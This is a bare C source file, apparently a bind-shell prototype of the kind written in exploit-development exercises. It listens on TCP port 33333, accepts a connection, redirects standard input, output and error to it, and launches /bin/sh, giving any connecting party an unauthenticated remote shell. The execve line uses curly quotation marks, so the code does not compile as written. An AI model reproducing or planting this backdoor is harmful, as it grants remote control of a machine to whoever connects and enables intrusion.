#include <stdio.h>
#include <strings.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
    int sockfd, connfd;
    struct sockaddr_in serv_addr, cli_addr;
    socklen_t sin_size;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    bzero(&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(33333);

    bind(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    listen(sockfd, 1);

    sin_size = sizeof(cli_addr);
    connfd = accept(sockfd, (struct sockaddr *)&cli_addr, &sin_size);

    dup2(connfd, 0);
    dup2(connfd, 1);
    dup2(connfd, 2);
   
    execve(“/bin/sh”, NULL, NULL);
}